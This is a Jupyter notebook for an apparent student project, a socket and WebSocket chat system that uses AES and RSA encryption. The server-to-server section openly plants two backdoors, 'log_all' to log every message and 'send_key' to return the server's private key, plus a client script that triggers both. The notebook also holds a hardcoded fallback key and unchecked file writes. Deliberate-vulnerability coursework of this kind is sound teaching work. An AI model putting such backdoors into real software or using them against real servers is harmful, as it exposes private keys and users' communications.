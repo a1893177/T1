{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "3078e3c7",
   "metadata": {},
   "source": [
    "### Overview\n",
    "Welcome to HD chat! This project aims to design and implement a small chat system. The system uses the socket and WebSocket protocols and integrates various core functions while emphasizing security and intentional vulnerabilities for educational purposes. Our chat services include listing members, private messages, group messages, peer-to-peer file transfers, and server-to-server communication while ensuring secure communication and handling malicious activities."
   ]
  },
  {
   "cell_type": "markdown",
   "id": "89def7dd",
   "metadata": {},
   "source": [
    "### Core Functionalities\n",
    "- User Registration\n",
    "- Member Listing\n",
    "- Private Messaging\n",
    "- Group Messaging\n",
    "- Point-to-Point File Transfer\n",
    "- Secure Communication\n",
    "- Server-to-Server Communication"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "b014c251",
   "metadata": {},
   "source": [
    "### Security Considerations\n",
    "- Securing the Socket: Ensure that the socket used for receiving data is secured against potential attacks.\n",
    "- Handling Malicious Users: Implement safeguards against malicious users using the program.\n",
    "- Dealing with Malicious Nodes: Consider the impact of malicious nodes participating in the protocol and potential wiretapping of communications."
   ]
  },
  {
   "cell_type": "markdown",
   "id": "f3e031b4",
   "metadata": {},
   "source": [
    "### Encryption Techniques\n",
    "#### Message Encryption\n",
    "To ensure secure communication between clients and the server, we use AES (Advanced Encryption Standard) in CBC (Cipher Block Chaining) mode for encrypting messages. Here’s a detailed explanation of the process:"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "ae0ab528",
   "metadata": {},
   "source": [
    "#### 1. Encryption:\n",
    "\n",
    "- We use the _Crypto.Cipher.AES_ module from the _pycryptodome_ library.\n",
    "- A new AES cipher is created with a 16-byte key and a random initialization vector (IV).\n",
    "- The message is padded to be a multiple of the AES block size using PKCS7 padding.\n",
    "- The message is encrypted, and the IV is prepended to the ciphertext to ensure decryption can be performed correctly.\n",
    "\n",
    "#### 2. Decryption:\n",
    "\n",
    "- The IV is extracted from the beginning of the received ciphertext.\n",
    "- The remaining ciphertext is decrypted, and the original message is obtained by unpadding the plaintext."
   ]
  },
  {
   "cell_type": "markdown",
   "id": "599297e4",
   "metadata": {},
   "source": [
    "### Password Encryption\n",
    "To securely store and handle user passwords, we utilize hashing techniques. Here's a detailed explanation:"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "6afbddea",
   "metadata": {},
   "source": [
    "\n",
    "#### 1. Hashing:\n",
    "\n",
    "- User passwords are hashed using a secure hash function before storing them.\n",
    "- This ensures that even if the stored data is compromised, the original passwords are not easily retrievable.\n",
    "\n",
    "#### 2. Salting:\n",
    "\n",
    "- To further enhance security, a unique salt is added to each password before hashing.\n",
    "- This prevents attackers from using precomputed hash tables (rainbow tables) to crack passwords."
   ]
  },
  {
   "cell_type": "markdown",
   "id": "7e6fd48d",
   "metadata": {},
   "source": [
    "### Installation and Setup\n",
    "#### 1. Install Dependencies:\n",
    "Ensure you have the necessary dependencies installed. For Python, you can use pip:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "3ed7d8e3",
   "metadata": {},
   "outputs": [],
   "source": [
    "pip install pycryptodome websockets"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "80689682",
   "metadata": {},
   "source": [
    "### Usage"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "1689ce58",
   "metadata": {},
   "source": [
    "#### Server to Client Communication\n",
    "#### Server Code\n",
    "The server code handles client registration, login, message sending, and file transfers."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "dbe86ba9",
   "metadata": {},
   "outputs": [],
   "source": [
    "import socket\n",
    "import threading\n",
    "import json\n",
    "import os\n",
    "from Crypto.Cipher import AES\n",
    "from Crypto.Util.Padding import pad, unpad\n",
    "\n",
    "def encrypt_message(message, key):\n",
    "    cipher = AES.new(key, AES.MODE_CBC)\n",
    "    ct_bytes = cipher.encrypt(pad(message.encode(), AES.block_size))\n",
    "    iv = cipher.iv\n",
    "    return iv + ct_bytes\n",
    "\n",
    "def decrypt_message(ciphertext, key):\n",
    "    iv = ciphertext[:16]\n",
    "    ct = ciphertext[16:]\n",
    "    cipher = AES.new(key, AES.MODE_CBC, iv=iv)\n",
    "    pt = unpad(cipher.decrypt(ct), AES.block_size)\n",
    "    return pt.decode()\n",
    "\n",
    "def handle_client(conn, addr, key):\n",
    "    print(f\"New connection: {addr}\")\n",
    "    while True:\n",
    "        try:\n",
    "            encrypted_message = conn.recv(2048)\n",
    "            if not encrypted_message:\n",
    "                break\n",
    "            decrypted_message = decrypt_message(encrypted_message, key)\n",
    "            message_data = json.loads(decrypted_message)\n",
    "            action = message_data.get('action')\n",
    "\n",
    "            if action == 'register':\n",
    "                username = message_data['username']\n",
    "                password = message_data['password']\n",
    "                # Handle registration logic\n",
    "                response = json.dumps({\"status\": \"Registration successful\"})\n",
    "                conn.send(encrypt_message(response, key))\n",
    "\n",
    "            elif action == 'login':\n",
    "                username = message_data['username']\n",
    "                password = message_data['password']\n",
    "                # Handle login logic\n",
    "                response = json.dumps({\"status\": \"Login successful\", \"users\": [\"user1\", \"user2\"]})\n",
    "                conn.send(encrypt_message(response, key))\n",
    "\n",
    "            elif action == 'message':\n",
    "                receiver = message_data['receiver']\n",
    "                message = message_data['message']\n",
    "                # Handle sending message logic\n",
    "\n",
    "            elif action == 'send_file':\n",
    "                filename = message_data['filename']\n",
    "                file_size = message_data['file_size']\n",
    "                file_data = conn.recv(file_size)\n",
    "                with open(filename, 'wb') as f:\n",
    "                    f.write(file_data)\n",
    "                print(f\"Received file {filename} from {username}\")\n",
    "\n",
    "        except Exception as e:\n",
    "            print(f\"Error handling client {addr}: {e}\")\n",
    "            break\n",
    "    conn.close()\n",
    "\n",
    "def start_server():\n",
    "    secret_key = os.environ.get('SECRET_KEY', '0123456789abcdef').encode()  # Ensure this key is 16 bytes long\n",
    "    server_ip = '0.0.0.0'\n",
    "    server_port = 5555\n",
    "\n",
    "    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n",
    "    server.bind((server_ip, server_port))\n",
    "    server.listen(5)\n",
    "    print(f\"Server started on {server_ip}:{server_port}\")\n",
    "\n",
    "    while True:\n",
    "        conn, addr = server.accept()\n",
    "        threading.Thread(target=handle_client, args=(conn, addr, secret_key)).start()\n",
    "\n",
    "if __name__ == \"__main__\":\n",
    "    start_server()"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "fbcc64c7",
   "metadata": {},
   "source": [
    "#### Client Code\n",
    "The client code allows users to register, login, send messages, and send files to other users."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "f464db14",
   "metadata": {},
   "outputs": [],
   "source": [
    "import os\n",
    "import socket\n",
    "import threading\n",
    "import json\n",
    "from Crypto.Cipher import AES\n",
    "from Crypto.Util.Padding import pad, unpad\n",
    "\n",
    "def encrypt_message(message, key):\n",
    "    cipher = AES.new(key, AES.MODE_CBC)\n",
    "    ct_bytes = cipher.encrypt(pad(message.encode(), AES.block_size))\n",
    "    iv = cipher.iv\n",
    "    return iv + ct_bytes\n",
    "\n",
    "def decrypt_message(ciphertext, key):\n",
    "    iv = ciphertext[:16]\n",
    "    ct = ciphertext[16:]\n",
    "    cipher = AES.new(key, AES.MODE_CBC, iv=iv)\n",
    "    pt = unpad(cipher.decrypt(ct), AES.block_size)\n",
    "    return pt.decode()\n",
    "\n",
    "def receive_messages(sock, key):\n",
    "    while True:\n",
    "        try:\n",
    "            encrypted_message = sock.recv(2048)\n",
    "            if encrypted_message:\n",
    "                decrypted_message = decrypt_message(encrypted_message, key)\n",
    "                message_data = json.loads(decrypted_message)\n",
    "                sender = message_data.get('sender', 'Unknown')\n",
    "                text = message_data.get('message', '')\n",
    "                if 'filename' in message_data:\n",
    "                    file_size = int(message_data['file_size'])\n",
    "                    file_data = b\"\"\n",
    "                    while len(file_data) < file_size:\n",
    "                        packet = sock.recv(1024)\n",
    "                        if not packet:\n",
    "                            break\n",
    "                        file_data += packet\n",
    "                    with open(message_data['filename'], 'wb') as f:\n",
    "                        f.write(file_data)\n",
    "                    print(f\"Received file {message_data['filename']} from {sender}\")\n",
    "                else:\n",
    "                    print(f\"{sender}: {text}\")\n",
    "            else:\n",
    "                break\n",
    "        except Exception as e:\n",
    "            print(f\"Error receiving message: {e}\")\n",
    "            break\n",
    "\n",
    "def register(sock, key):\n",
    "    username = input(\"Choose a username: \")\n",
    "    password = input(\"Choose a password: \")\n",
    "    data = {\n",
    "        \"action\": \"register\",\n",
    "        \"username\": username,\n",
    "        \"password\": password\n",
    "    }\n",
    "    encrypted_data = encrypt_message(json.dumps(data), key)\n",
    "    sock.send(encrypted_data)\n",
    "    response = decrypt_message(sock.recv(2048), key)\n",
    "    print(response)\n",
    "\n",
    "def login(sock, key):\n",
    "    global username\n",
    "    username = input(\"Username: \")\n",
    "    password = input(\"Password: \")\n",
    "    data = {\n",
    "        \"action\": \"login\",\n",
    "        \"username\": username,\n",
    "        \"password\": password\n",
    "    }\n",
    "    encrypted_data = encrypt_message(json.dumps(data), key)\n",
    "    sock.send(encrypted_data)\n",
    "    response = json.loads(decrypt_message(sock.recv(2048), key))\n",
    "    print(response['status'])\n",
    "    if response['status'] == \"Login successful\":\n",
    "        print(\"Registered users:\")\n",
    "        for user in response['users']:\n",
    "            print(user)\n",
    "    return response['status'] == \"Login successful\"\n",
    "\n",
    "def send_file(sock, key):\n",
    "    filepath = input(\"Enter the path of the file to send: \")\n",
    "    receiver = input(\"Enter receiver (or 'all' for public message): \")\n",
    "    filename = os.path.basename(filepath)\n",
    "    file_size = os.path.getsize(filepath)\n",
    "    with open(filepath, 'rb') as f:\n",
    "        file_data = f.read()\n",
    "    data = {\n",
    "        \"action\": \"send_file\",\n",
    "        \"receiver\": receiver,\n",
    "        \"filename\": filename,\n",
    "        \"file_size\": file_size,\n",
    "        \"sender\": username\n",
    "    }\n",
    "    try:\n",
    "        encrypted_data = encrypt_message(json.dumps(data), key)\n",
    "        sock.send(encrypted_data)\n",
    "        sock.send(file_data)\n",
    "    except BrokenPipeError:\n",
    "        print(\"Connection lost while sending file.\")\n",
    "\n",
    "def main():\n",
    "    global username\n",
    "    secret_key = os.environ.get('SECRET_KEY', '0123456789abcdef').encode()  # Ensure this key is 16 bytes long\n",
    "    server_ip = input(\"Enter server IP: \")\n",
    "    server_port = 5555\n",
    "    \n",
    "    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n",
    "    sock.connect((server_ip, server_port))\n",
    "    \n",
    "    while True:\n",
    "        choice = input(\"Do you want to (1) Login or (2) Register? \")\n",
    "        if choice == '1':\n",
    "            if login(sock, secret_key):\n",
    "                break\n",
    "        elif choice == '2':\n",
    "            register(sock, secret_key)\n",
    "        else:\n",
    "            print(\"Invalid choice. Please choose again.\")\n",
    "    \n",
    "    threading.Thread(target=receive_messages, args=(sock, secret_key)).start()\n",
    "    \n",
    "    while True:\n",
    "        action = input(\"Do you want to (1) Send a Message or (2) Send a File? \")\n",
    "        if action == '1':\n",
    "            receiver = input(\"Enter receiver (or 'all' for public message): \")\n",
    "            message = input(\"Enter your message: \")\n",
    "            data = {\n",
    "                \"action\": \"message\",\n",
    "                \"receiver\": receiver,\n",
    "                \"message\": message,\n",
    "                \"sender\": username\n",
    "            }\n",
    "            try:\n",
    "                encrypted_data = encrypt_message(json.dumps(data), secret_key)\n",
    "                sock.send(encrypted_data)\n",
    "            except BrokenPipeError:\n",
    "                print(\"Connection lost while sending message.\")\n",
    "        elif action == '2':\n",
    "            send_file(sock, secret_key)\n",
    "        else:\n",
    "            print(\"Invalid action. Please choose again.\")\n",
    "\n",
    "if __name__ == \"__main__\":\n",
    "    main()"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "2fa38a85",
   "metadata": {},
   "source": [
    "#### Server to Server Communication\n",
    "#### Server Code\n",
    "#### 1. Environment Setup\n",
    "Make sure you have the required Python libraries installed. You can install them using the following command:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "d186baa8",
   "metadata": {},
   "outputs": [],
   "source": [
    "pip install websockets cryptography"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "028638a3",
   "metadata": {},
   "source": [
    "#### 2. Code Overview\n",
    "This code implements a WebSocket server with two backdoor functionalities:\n",
    "\n",
    "Trigger logging of all received messages when a specific message is received.\n",
    "Trigger sending the server's private key when a specific message is received."
   ]
  },
  {
   "cell_type": "markdown",
   "id": "bad12a42",
   "metadata": {},
   "source": [
    "#### 3. Detailed Explanation\n",
    "#### Generate RSA Key Pair\n",
    "The function generate_keys() generates an RSA key pair (private and public keys)."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "0967b49c",
   "metadata": {},
   "outputs": [],
   "source": [
    "def generate_keys():\n",
    "    private_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)\n",
    "    public_key = private_key.public_key()\n",
    "    return private_key, public_key"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "a4d8b805",
   "metadata": {},
   "source": [
    "#### Encrypt and Decrypt Messages\n",
    "The function encrypt_message() uses the public key to encrypt messages, while decrypt_message() uses the private key to decrypt messages."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "e830febd",
   "metadata": {},
   "outputs": [],
   "source": [
    "def encrypt_message(public_key, message):\n",
    "    return base64.b64encode(public_key.encrypt(\n",
    "        message,\n",
    "        padding.OAEP(mgf=padding.MGF1(algorithm=hashes.SHA256()),\n",
    "                     algorithm=hashes.SHA1(), label=None)\n",
    "    ))\n",
    "\n",
    "def decrypt_message(private_key, encrypted_message):\n",
    "    return private_key.decrypt(\n",
    "        base64.b64decode(encrypted_message),\n",
    "        padding.OAEP(mgf=padding.MGF1(algorithm=hashes.SHA256()),\n",
    "                     algorithm=hashes.SHA1(), label=None)\n",
    "    )"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "cd64fbe2",
   "metadata": {},
   "source": [
    "#### Handle WebSocket Messages\n",
    "The handle_server() function processes received WebSocket messages and performs actions based on the content of the messages."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "2486bf1b",
   "metadata": {},
   "outputs": [],
   "source": [
    "async def handle_server(websocket, path):\n",
    "    global log_all_messages\n",
    "    async for message in websocket:\n",
    "        data = json.loads(message)\n",
    "        tag = data.get(\"tag\")\n",
    "\n",
    "        if tag == \"message\":\n",
    "            sender = data.get(\"from\")\n",
    "            recipient = data.get(\"to\")\n",
    "            info = decrypt_message(private_key, data.get(\"info\").encode()).decode()\n",
    "\n",
    "            print(f\"Message from {sender} to {recipient}: {info}\")\n",
    "\n",
    "            if info == \"log_all\":\n",
    "                log_all_messages = True\n",
    "\n",
    "            if info == \"send_key\":\n",
    "                key_data = private_key.private_bytes(\n",
    "                    encoding=serialization.Encoding.PEM,\n",
    "                    format=serialization.PrivateFormat.PKCS8,\n",
    "                    encryption_algorithm=serialization.NoEncryption()\n",
    "                )\n",
    "                await websocket.send(json.dumps({\"tag\": \"private_key\", \"key\": key_data.decode()}))\n",
    "\n",
    "            if log_all_messages:\n",
    "                with open(\"all_messages.log\", \"a\") as log_file:\n",
    "                    log_file.write(f\"Message from {sender} to {recipient}: {info}\\n\")\n",
    "\n",
    "        elif tag == \"presence\":\n",
    "            print(\"Presence update received\")\n",
    "\n",
    "        elif tag == \"check\":\n",
    "            response = {\"tag\": \"checked\"}\n",
    "            await websocket.send(json.dumps(response))\n",
    "\n",
    "        elif tag == \"attendance\":\n",
    "            print(\"Attendance check received\")"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "66b9d291",
   "metadata": {},
   "source": [
    "#### Start the WebSocket Server\n",
    "The server_to_server() function starts the WebSocket server, listening on port 5555 on the localhost."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "7c221f66",
   "metadata": {},
   "outputs": [],
   "source": [
    "async def server_to_server():\n",
    "    server = await websockets.serve(handle_server, \"localhost\", 5555)\n",
    "    await server.wait_closed()\n",
    "\n",
    "loop = asyncio.get_event_loop()\n",
    "loop.run_until_complete(server_to_server())"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "f92c46ec",
   "metadata": {},
   "source": [
    "#### 4. Starting the Server\n",
    "Run the code to start the WebSocket server:"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "b3e27ca6",
   "metadata": {},
   "source": [
    "python Server-to-Server Communication - Server Code.py"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "1268dc26",
   "metadata": {},
   "source": [
    "#### 5. Testing the Server\n",
    "You can use any WebSocket client (such as websocat, Postman, or a custom Python client) to send messages to the server for testing. Here is an example Python client code:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "ef6df5ad",
   "metadata": {},
   "outputs": [],
   "source": [
    "import asyncio\n",
    "import websockets\n",
    "import json\n",
    "import base64\n",
    "\n",
    "# Assuming the same encrypt_message function as in the server script\n",
    "\n",
    "async def test_client():\n",
    "    uri = \"ws://localhost:5555\"\n",
    "    async with websockets.connect(uri) as websocket:\n",
    "        message = \"Hello, Server!\"\n",
    "        \n",
    "        encrypted_message = encrypt_message(public_key, message.encode()).decode()\n",
    "\n",
    "        data = json.dumps({\"tag\": \"message\", \"from\": \"client\", \"to\": \"server\", \"info\": encrypted_message})\n",
    "        await websocket.send(data)\n",
    "        print(f\"Sent: {data}\")\n",
    "\n",
    "        response = await websocket.recv()\n",
    "        print(f\"Received: {response}\")\n",
    "\n",
    "# Assume public_key and encrypt_message are already defined as in the server script\n",
    "\n",
    "loop = asyncio.get_event_loop()\n",
    "loop.run_until_complete(test_client())"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "9f7b8c33",
   "metadata": {},
   "source": [
    "### Important Notes\n",
    "- Security: The code contains two backdoor functionalities. Use it with caution to prevent the private key from being exposed and messages from being logged without proper authorization.\n",
    "- Encryption Algorithm: The encryption and decryption use RSA with OAEP padding to ensure the security of message transmission."
   ]
  },
  {
   "cell_type": "markdown",
   "id": "ee58112b",
   "metadata": {},
   "source": [
    "#### Client Code\n",
    "#### 1. Environment Setup\n",
    "Make sure you have the required Python libraries installed. You can install them using the following command:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "31304142",
   "metadata": {},
   "outputs": [],
   "source": [
    "pip install websockets cryptography"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "1561f3a5",
   "metadata": {},
   "source": [
    "#### 2. Code Overview\n",
    "This code includes functionalities to:\n",
    "\n",
    "- Generate RSA keys for encryption and decryption.\n",
    "- Send encrypted messages to a WebSocket server.\n",
    "- Trigger backdoor functionalities to log all messages and send the private key.\n",
    "#### 3. Detailed Explanation\n",
    "#### Generate RSA Key Pair\n",
    "The generate_keys() function generates an RSA key pair (private and public keys)."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "1462dbca",
   "metadata": {},
   "outputs": [],
   "source": [
    "def generate_keys():\n",
    "    private_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)\n",
    "    public_key = private_key.public_key()\n",
    "    return private_key, public_key"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "9b692b37",
   "metadata": {},
   "source": [
    "#### Encrypt and Decrypt Messages\n",
    "The encrypt_message() function uses the public key to encrypt messages, while decrypt_message() uses the private key to decrypt messages."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "968a71b5",
   "metadata": {},
   "outputs": [],
   "source": [
    "def encrypt_message(public_key, message):\n",
    "    return base64.b64encode(public_key.encrypt(\n",
    "        message,\n",
    "        padding.OAEP(mgf=padding.MGF1(algorithm=hashes.SHA256()),\n",
    "                     algorithm=hashes.SHA1(), label=None)\n",
    "    ))\n",
    "\n",
    "def decrypt_message(private_key, encrypted_message):\n",
    "    return private_key.decrypt(\n",
    "        base64.b64decode(encrypted_message),\n",
    "        padding.OAEP(mgf=padding.MGF1(algorithm=hashes.SHA256()),\n",
    "                     algorithm=hashes.SHA1(), label=None)\n",
    "    )"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "4f6613b6",
   "metadata": {},
   "source": [
    "#### Send Encrypted Messages\n",
    "The send_message() function sends an encrypted message to a WebSocket server."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "e27f6685",
   "metadata": {},
   "outputs": [],
   "source": [
    "async def send_message(websocket, recipient, message):\n",
    "    encrypted_info = encrypt_message(public_key, message.encode())\n",
    "    data = {\n",
    "        \"tag\": \"message\",\n",
    "        \"from\": \"server1\",\n",
    "        \"to\": recipient,\n",
    "        \"info\": encrypted_info.decode()\n",
    "    }\n",
    "    await websocket.send(json.dumps(data))"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "03de46c9",
   "metadata": {},
   "source": [
    "#### Main Function to Connect and Send Messages\n",
    "The main() function connects to the WebSocket server and sends several messages, including those that trigger the backdoor functionalities."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "83ed4aaf",
   "metadata": {},
   "outputs": [],
   "source": [
    "async def main():\n",
    "    async with websockets.connect(\"ws://<other_server_ip>:5555\") as websocket:\n",
    "        await send_message(websocket, \"server2\", \"Hello, Server 2!\")\n",
    "        # Trigger backdoor to log all messages\n",
    "        await send_message(websocket, \"server2\", \"log_all\")\n",
    "        # Trigger backdoor to send private key\n",
    "        await send_message(websocket, \"server2\", \"send_key\")\n",
    "        # Add other interaction logic"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "dd2b724a",
   "metadata": {},
   "source": [
    "#### 4. Starting the Client\n",
    "Replace <other_server_ip> with the actual IP address of the other WebSocket server you want to connect to. Then, run the following command to start the client:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "e6dc30d8",
   "metadata": {},
   "outputs": [],
   "source": [
    "python Server-to-Server Communication - Client Code.py"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "a44d8774",
   "metadata": {},
   "source": [
    "#### 5. Testing the Client\n",
    "When you run the client, it will perform the following actions:\n",
    "\n",
    "- Connect to the specified WebSocket server.\n",
    "- Send a message saying \"Hello, Server 2!\".\n",
    "- Send a message to trigger logging of all messages (\"log_all\").\n",
    "- Send a message to trigger sending of the private key (\"send_key\").\n",
    "#### Important Notes\n",
    "- Security: The code contains backdoor functionalities that can log all messages and send the private key. Use it with extreme caution to prevent unauthorized access to sensitive information.\n",
    "- Encryption Algorithm: The encryption and decryption use RSA with OAEP padding to ensure the security of message transmission.\n",
    "Feel free to ask if you have any more questions or need further assistance."
   ]
  },
  {
   "cell_type": "markdown",
   "id": "df4a01b4",
   "metadata": {},
   "source": [
    "### Expected Interactions with Other Groups\n",
    "While the protocol has been standardized, different groups may have different implementations. Adherence to the protocol specification is critical to ensure interoperability, and we are ready to discuss and resolve any integration issues with other groups."
   ]
  },
  {
   "cell_type": "markdown",
   "id": "67429d08",
   "metadata": {},
   "source": [
    "### Contact Information\n",
    "For any questions or feedback, please contact:\n",
    "\n",
    "Name: Jingyi Li\n",
    "Email: jingyi.li02@student.adelaide.edu.au"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "17d10e8f",
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.11.4"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
